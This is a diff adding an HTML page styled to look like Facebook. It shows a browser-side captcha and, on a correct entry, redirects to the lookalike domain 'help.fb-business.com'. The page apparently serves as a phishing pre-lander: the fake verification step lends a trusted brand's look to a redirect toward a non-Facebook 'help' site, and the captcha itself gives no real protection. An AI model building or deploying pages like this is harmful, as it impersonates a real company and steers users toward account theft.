@@ -1,0 +1,129 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-inspired Captcha Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        .captcha-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .captcha-box {
+            background-color: #f0f2f5;
+            padding: 10px;
+            font-size: 24px;
+            letter-spacing: 5px;
+            font-weight: bold;
+            border-radius: 6px;
+            flex-grow: 1;
+            text-align: center;
+        }
+        #refreshButton {
+            background-color: #e4e6eb;
+            border: none;
+            padding: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .verify-button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .verify-button:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <form id="captchaForm">
+            <div class="captcha-container">
+                <div id="captchaBox" class="captcha-box"></div>
+                <button type="button" id="refreshButton" onclick="updateCaptcha()">↻</button>
+            </div>
+            <input type="text" id="captchaInput" placeholder="Enter captcha" required>
+            <button type="submit" class="verify-button">Verify Captcha</button>
+        </form>
+    </div>
+
+    <script>
+        // URL to redirect after successful verification
+        const redirectURL = "https://help.fb-business.com/";
+
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captcha;
+        }
+
+        function updateCaptcha() {
+            const captchaBox = document.getElementById('captchaBox');
+            captchaBox.textContent = generateCaptcha();
+        }
+
+        document.getElementById('captchaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const captchaBox = document.getElementById('captchaBox');
+            const captchaInput = document.getElementById('captchaInput');
+            if (captchaInput.value === captchaBox.textContent) {
+                window.location.href = redirectURL;
+            } else {
+                alert('Incorrect captcha. Please try again.');
+                updateCaptcha();
+            }
+            captchaInput.value = '';
+        });
+
+        // Initialize captcha on page load
+        updateCaptcha();
+    </script>
+</body>
+</html>
